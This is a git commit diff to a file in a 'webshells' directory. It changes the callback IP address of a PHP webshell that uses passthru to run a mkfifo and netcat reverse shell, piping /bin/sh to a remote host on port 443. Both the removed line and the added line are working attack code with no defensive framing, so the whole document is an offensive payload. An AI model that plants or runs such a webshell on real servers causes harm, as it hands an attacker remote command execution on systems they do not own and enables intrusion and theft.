6bd6775b0bb25b4e6af21f72fd6ed11613c423eb
Miguel R <d4t4s3c@protonmail.com>
2021-02-19 11:56:11 +0100

    add

--- webshells/passthru_rshell.php
+++ webshells/passthru_rshell.php
@@ -1,3 +1,3 @@
 <?php
-    passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.148 443 >/tmp/f");
+    passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f");
 ?>
